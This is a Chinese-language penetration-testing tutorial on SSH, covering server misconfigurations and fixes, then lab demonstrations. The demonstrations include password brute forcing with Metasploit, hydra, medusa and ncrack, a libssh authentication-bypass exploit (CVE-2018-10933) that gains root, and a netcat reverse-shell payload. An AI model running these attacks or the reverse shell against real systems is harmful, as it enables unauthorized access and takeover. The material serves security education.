<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>渗透测试中的SSH</title>
</head>
<body>
<p><a href="https://zhuanlan.zhihu.com/p/101260538">原文</a></p>
<div class="title-image"><img src="https://pic2.zhimg.com/v2-6c752bdf4bd8271296bcba570ce8e9be_b.jpg" alt=""></div><h2>什么是SSH和SFTP？</h2><p><b>SSH</b></p><p>是一种安全的远程外壳协议，用于通过不安全的网络安全地运行网络服务。默认的 SSH 端口是 22，通常会在 Internet 或 Intranet 的服务器上开启。</p><p><b>SFTP</b></p><p>是 SSH 文件传输协议，该协议用于通过 SSH 连接传输文件，大多数 SSH 实现也支持 SFTP。</p><h2>SSH服务器/库</h2><p>最常见的 SSH 服务器和客户端是 openSSH（OpenBSD 安全外壳）。是 SSH 的一个功能强大的开源实现。OpenSSH 提供了服务端后台程序和客户端工具，用来加密远程控制和文件传输过程中的数据，并由此来代替原来的类似服务。</p><p>但是 openSSH 并不是唯一的实现，还有其他的：</p><p><b>SSH 服务器</b></p><ul><li>openSSH – OpenBSD SSH，自 Windows 10 起在 BSD，Linux 发行版和 Windows中提供</li><li>Dropbear – OpenWrt 附带的用于内存和处理器资源较少的环境的SSH实现</li><li>PuTTY – Windows 的 SSH 实现，通常使用客户端，但很少使用服务器</li><li>CopSSH – Windows 版 OpenSSH</li></ul><p><b>SSH库（在服务器端实现）</b></p><ul><li>libssh -多平台 C 库实现与在绑定 SSHv2 的协议 Python、Perl; 它由 KDE 用于 sftp，由 GitHub 用于 git SSH 基础结构</li><li>wolfSSH –用 ANSI C 编写的 SSHv2 服务器库，面向嵌入式、RTOS 和资源受限的环境</li><li>Apache MINA SSHD – Apache SSHD Java 库基于 Apache MINA</li><li>paramiko – Python SSHv2 协议库</li></ul><h2>常见的配置错误</h2><p><b>001-root登录</b></p><p>默认情况下，大多数 SSH 服务器实现将允许 root 登录，建议禁用，因为如果该帐户的密码泄漏，攻击者将直接获得管理员权限。</p><p><b>如何禁用openSSH的root登录：</b></p><ul><li>编辑 SSH 服务器配置 sudoedit /etc/ssh/sshd_config</li><li>更改 #PermitRootLogin yes 成 PermitRootLogin no</li><li>考虑配置更改：sudo systemctl daemon-reload</li><li>重启 SSH 服务器 sudo systemctl restart sshd </li></ul><p><b>002-SFTP 命令执行</b></p><p>另一个常见的 SSH 错误配置通常出现在 SFTP 配置中。很多人在创建 SFTP 服务器时，管理员希望用户具有 SFTP 访问权限来共享文件，而不希望在计算机上获得远程 Shell。因此，在创建用户时为用户分配 placeholder shell（如 /usr/bin/nologin 或 /usr/bin/false）并避免 shell 访问或滥用整个文件系统。</p><p>这样是错误的，用户可以在身份验证后立即要求执行命令，然后再执行其默认命令或 shell 程序。因此，只需执行以下操作即可执行命令（例如 /bin/bash）：</p><div class="highlight"><pre><code class="language-text">$ ssh -v noraj@192.168.1.94 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.1.94 ([192.168.1.94]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

$ ssh noraj@192.168.1.94 /bin/bash</code></pre></div><p>这是用户 noraj 的 SFTP 配置（/ etc / ssh / sshd_config – openSSH）：</p><div class="highlight"><pre><code class="language-text">Match User noraj
        ChrootDirectory %h
        ForceCommand internal-sftp
        AllowTcpForwarding no
        PermitTunnel no
        X11Forwarding no
        PermitTTY no</code></pre></div><p>此配置将仅允许 SFTP 通过强制启动命令并禁用 TTY 访问来禁用 shell 程序访问，还可以禁用所有类型的端口转发或隧道。</p><p><b>003-认证方式</b></p><p>在安全性较高的环境中，通常是仅启用基于密钥或两因素的身份验证，而不是基于简单因素密码的身份验证。但是通常启用更强的身份验证方法而不会禁用较弱的身份验证方法。一种常见的情况是启用 publickeyopenSSH 配置并将其设置为默认方法，而不是禁用 password。因此，通过使用 SSH 客户端的 verbose 模式，攻击者可以看到启用了一种较弱的方法：</p><div class="highlight"><pre><code class="language-text">$ ssh -v 192.168.1.94
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive</code></pre></div><p>例如，如果设置了身份验证失败限制，而也没有机会使用密码，则可以使用 PreferredAuthentications 选项强制调用此方法。</p><div class="highlight"><pre><code class="language-text">$ ssh -v 192.168.1.94 -o PreferredAuthentications=password
...
debug1: Next authentication method: password</code></pre></div><p>查看 SSH 服务器配置，检查是否仅授权了所讲的方法。</p><h2>攻击演示</h2><p>一系列攻击示例，可以在某些 SSH 服务器中进行测试。</p><p><b>密码猜测/爆破</b></p><p>目标：192.168.1.94 端口：22</p><p><b>Metasploit</b></p><div class="highlight"><pre><code class="language-text">$ msf5 &gt; search ssh

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
...
   17  auxiliary/scanner/ssh/ssh_login                                              normal     Yes    SSH Login Check Scanner
...
msf5 &gt; use 17
msf5 auxiliary(scanner/ssh/ssh_login) &gt; show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /usr/share/wordlists/password/rockyou.txt
PASS_FILE =&gt; /usr/share/wordlists/password/rockyou.txt
msf5 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 192.168.1.94
RHOSTS =&gt; 192.168.1.94
msf5 auxiliary(scanner/ssh/ssh_login) &gt; set THREADS 10
THREADS =&gt; 10
msf5 auxiliary(scanner/ssh/ssh_login) &gt; set STOP_ON_SUCCESS true
STOP_ON_SUCCESS =&gt; true
msf5 auxiliary(scanner/ssh/ssh_login) &gt; set username noraj
username =&gt; noraj
msf5 auxiliary(scanner/ssh/ssh_login) &gt; run

[+] 192.168.1.94:22 - Success: &#39;noraj:noraj&#39; &#39;&#39;
[*] Command shell session 1 opened (192.168.1.83:37291 -&gt; 192.168.1.94:22) at 2020-01-02 21:33:33 +0100
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed</code></pre></div><p><b>hydra（九头蛇）</b></p><div class="highlight"><pre><code class="language-text">$ hydra -l noraj -P /usr/share/wordlists/password/rockyou.txt -e s ssh://192.168.1.94
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-02 21:44:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.94:22/
[22][ssh] host: 192.168.1.94   login: noraj   password: noraj
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-02 21:44:33</code></pre></div><p>参数：</p><blockquote>-l LOGIN or -L FILE  使用名称登录，或从文件中加载多个登录名 <br/>-p PASS  or -P FILE  使用密码登录，或从文件加载多个密码<br/>-e nsr    尝试使用“ n”个空密码，以“ s”作为通过登录名和“ r”反向登录服务破解服务</blockquote><p><b>medusa</b></p><div class="highlight"><pre><code class="language-text">$ medusa -h 192.168.1.94 -u noraj -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;

ACCOUNT CHECK: [ssh] Host: 192.168.1.94 (1 of 1, 0 complete) User: noraj (1 of 1, 0 complete) Password: noraj (1 of 14344391 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.1.94 User: noraj Password: noraj [SUCCESS]</code></pre></div><p>参数：</p><blockquote>-h [TEXT]    : 目标主机名或 IP 地址<br/>-u [TEXT]    : 要测试的用户名<br/>-P [FILE]    : 要测试的密码文件<br/>-e [n/s/ns]  : 其他密码检查（[n]无密码，[s]密码=用户名）<br/>-M [TEXT]    : 要执行的模块的名称（不带 .mod 扩展名）</blockquote><p><b>Ncrack</b></p><div class="highlight"><pre><code class="language-text">$ ncrack --user noraj -P /usr/share/wordlists/password/rockyou.txt ssh://192.168.1.94
Starting Ncrack 0.7 ( http://ncrack.org ) at 2020-01-02 21:50 CET

Discovered credentials for ssh on 192.168.1.94 22/tcp:
192.168.1.94 22/tcp ssh: &#39;noraj&#39; &#39;noraj&#39;

Ncrack done: 1 service scanned in 3.00 seconds.

Ncrack finished.</code></pre></div><p>参数：</p><blockquote>-P &lt;filename&gt;: 密码文件<br/>--user &lt;username_list&gt;: 以逗号分隔的用户名列表</blockquote><h2>漏洞利用– LibSSH RCE</h2><p><b>CVE-2018-10933</b></p><p><a href="https://link.zhihu.com/?target=https%3A//cve.mitre.org/cgi-bin/cvename.cgi%3Fname%3DCVE-2018-10933" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">cve.mitre.org/cgi-bin/c</span><span class="invisible">vename.cgi?name=CVE-2018-10933</span><span class="ellipsis"></span></a></p><p>影响 libssh 库的漏洞，此漏洞通过绕过身份验证允许未经授权的访问。</p><blockquote>libssh 0.6 及更高版本在服务器代码中具有身份验证绕过漏洞。</blockquote><p>通过向服务器提供 SSH2_MSG_USERAUTH_SUCCESS 消息代替服务器希望进行身份验证的 SSH2_MSG_USERAUTH_REQUEST 消息，攻击者可以在没有任何凭据的情况下成功进行身份验证。</p><p>nmap 扫描结果：</p><div class="highlight"><pre><code class="language-text">22/tcp  open     ssh      libssh 0.8.3 (protocol 2.0)</code></pre></div><p>searchsploit（用于本地浏览 Exploit-DB 的工具）显示了可用于的现有漏洞利用 libssh。</p><div class="highlight"><pre><code class="language-text">searchsploit libssh
-------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                              |  Path
                                                                                            | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------- ----------------------------------------
LibSSH 0.7.6 / 0.8.4 - Unauthorized Access                                                  | exploits/linux/remote/46307.py
libSSH - Authentication Bypass                                                              | exploits/linux/remote/45638.py
-------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result</code></pre></div><p>因此，我们可以使用漏洞利用程序在目标上执行命令，确认其是否正常运行。</p><div class="highlight"><pre><code class="language-text">$ python /usr/share/exploitdb/exploits/linux/remote/46307.py 192.168.1.94 22 id
uid=0(root) gid=0(root) groups=0(root)</code></pre></div><p>尝试反向 shell，先打开监听</p><div class="highlight"><pre><code class="language-text">sudo ncat -nlp 80</code></pre></div><p>然后，在漏洞利用中使用 payload：</p><div class="highlight"><pre><code class="language-text">python /usr/share/exploitdb/exploits/linux/remote/46307.py 192.168.1.94 22 &#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.100 80 &gt;/tmp/f&#34;</code></pre></div><h2>模糊测试</h2><p>这里介绍两种：</p><ul><li>通用&amp;自动化</li><li>特定&amp;手工</li></ul><p><b>通用&amp;自动化</b></p><p>可以使用 sshfuzz.pl 之类的脚本来自动对 SSH 服务器实时进行模糊测试。</p><p>优点是操作简单，但是它的针对性不强，因此将花费大量时间并且错过很多结果。</p><div class="highlight"><pre><code class="language-text">$ cpan Net::SSH2
$ ./sshfuzz.pl -H 192.168.1.94 -P 22 -u noraj -p noraj</code></pre></div><p>另一种适用于任何 SSH 服务器的自动化检测工具，是使用 metasploit 的模块 <a href="https://link.zhihu.com/?target=https%3A//www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2" class=" wrap external" target="_blank" rel="nofollow noreferrer">auxiliary/fuzzers/ssh/ssh_version_2</a>：</p><div class="highlight"><pre><code class="language-text">msf5 &gt; use auxiliary/fuzzers/ssh/ssh_version_2
msf5 auxiliary(fuzzers/ssh/ssh_version_2) &gt; set RHOSTS 192.168.1.94
msf5 auxiliary(fuzzers/ssh/ssh_version_2) &gt; run
[*] Running module against 192.168.1.94

[*] 192.168.1.94:22 - Fuzzing with iteration 100 using fuzzer_string_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 200 using fuzzer_string_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 300 using fuzzer_string_long
[*] 192.168.1.94:22 - Fuzzing with iteration 400 using fuzzer_string_long
[*] 192.168.1.94:22 - Fuzzing with iteration 500 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 600 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 700 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 800 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 900 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 1000 using fuzzer_string_paths_giant
...</code></pre></div><p>这些工具使用起来很容易，但是找到可利用的机会很小。</p><p><b>特定&amp;手动</b></p><p>如果想找到漏洞或可利用的点，可以选择手动方法。需要尝试构建字典，深入理解 SSH 协议及其实现等等。</p><h2>相关工具和资源</h2><p><b>HASSH</b></p><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/salesforce/hassh" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">github.com/salesforce/h</span><span class="invisible">assh</span><span class="ellipsis"></span></a></p><blockquote>一种网络指纹识别标准，可用于标识特定的客户端和服务器SSH实现。指纹可以以 MD5 指纹的形式轻松存储、搜索和共享。</blockquote><p>HASSH 是一项标准，可帮助蓝队检测，控制和调查爆破或凭据填充、密码尝试、数据泄露、网络发现和横向移动等。ssh-audit 是 SSH 服务器审核工具。</p><p>对于渗透测试人员来说，快速检测目标版本并了解远程服务器上可用的算法，再向客户提供算法建议。</p><p><b>远程 SSH 漏洞</b></p><ul><li>Sysax 5.53-SSH&#39;Username&#39;远程缓冲区溢出（Metasploit）：<a href="https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/18557" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://www.</span><span class="visible">exploit-db.com/exploits</span><span class="invisible">/18557</span><span class="ellipsis"></span></a></li><li>OpenSSH &lt;6.6 SFTP-命令执行：<a href="https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/45001" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://www.</span><span class="visible">exploit-db.com/exploits</span><span class="invisible">/45001</span><span class="ellipsis"></span></a></li><li>OpenSSH 2.3 &lt;7.7-用户名枚举：<a href="https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/45233" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://www.</span><span class="visible">exploit-db.com/exploits</span><span class="invisible">/45233</span><span class="ellipsis"></span></a></li><li>OpenSSH SCP客户端-写入任意文件：<a href="https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/46516" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://www.</span><span class="visible">exploit-db.com/exploits</span><span class="invisible">/46516</span><span class="ellipsis"></span></a></li></ul><blockquote>源自 TURGENSEC <b>noraj</b></blockquote><p>更多有关内容请前往<a href="https://link.zhihu.com/?target=https%3A//twosecurity.cn%255C.zhihu.com/../" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a>进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 <b>twosecurity02</b></p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb lazy" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg"/></figure>
<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){ dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'UA-7909075-5');
</script>
<script>
var _hmt = _hmt || [];
</script>
<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
</body>
</html>
